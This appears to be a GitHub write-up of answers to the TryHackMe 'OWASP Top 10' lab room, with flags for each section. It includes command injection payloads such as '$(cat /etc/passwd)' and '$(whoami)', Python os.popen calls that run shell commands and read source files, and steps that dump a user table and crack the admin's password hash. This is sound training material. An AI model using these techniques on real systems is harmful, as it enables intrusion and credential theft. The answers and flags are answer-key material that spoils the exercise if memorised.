# TryHackMe-OWASP-Top-10

## Broken Access Control
Nothing Special was there, read an article about Broken Access Control how it works.

![Broken access control](https://github.com/user-attachments/assets/3e1ec8bf-14cb-453e-a733-fb2e9181475a)

## Cryptographic Failures

#### What is the name of the mentioned directory?
- Ans: /assets
  
![image](https://github.com/user-attachments/assets/d72fe275-95d4-4295-8be1-0f76070a2d80)

#### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
- Ans: webapp.db

#### Use the supporting material to access the sensitive data. What is the password hash of the admin user?
- Step 1: sqlite3 webapp.db
- Step 2: .tables
- Step 3: SELECT * FROM users;
- Ans: 6eea9b7ef19179a06954edd0f6c05ceb

![image](https://github.com/user-attachments/assets/9ca97d7b-f9d9-4fca-b1e6-8fcbc4b889ad)


#### What is the admin's plaintext password?
- Method: Go to the crack station website and paste the admin password hash we found from the previous question.
- Ans: qwertyuiop

![image](https://github.com/user-attachments/assets/06e8ab69-803b-4408-b1a8-e1e8fb68c225)


#### Log in as the admin. What is the flag?
 Ans: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Command Injection

#### What strange text file is in the website's root directory?
- Command: $(ls)
- Ans: drpepper.txt

![image](https://github.com/user-attachments/assets/9a75fffa-1535-44bb-8290-a9f454c8b999)

#### How many non-root/non-service/non-daemon users are there?
- Command: $(cat /etc/passwd)
- Ans: 0

#### What user is this app running as?
- Command: $(whoami)

![image](https://github.com/user-attachments/assets/32d73958-83ec-4bb8-8dcd-682ff23f034a)

- What is the user's shell set as?
- Command: $(cat /etc/passwd)
- Ans : /sbin/nologin

- What version of Alpine Linux is running?

![image](https://github.com/user-attachments/assets/3aa150f3-d1f4-4769-833a-414f84fc2706)

## Insecure Design

- What is the value of the flag in joseph's account?
- Ans: THM{Not_3ven_c4tz_c0uld_sav3_U!}

## Security Misconfiguration

#### What is the database file name (the one with the .db extension) in the current directory?
- Command: import os; print(os.popen("ls -l").read())
- Ans: todo.db

![image](https://github.com/user-attachments/assets/e09dec61-d6f1-42f2-9e30-3e9c89ee700a)

#### Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
- Command: import os; print(os.popen("cat app.py").read())
- Ans: THM{Just_a_tiny_misconfiguration}

![image](https://github.com/user-attachments/assets/4e516742-8e3b-421d-bf9e-2a36110f695a)
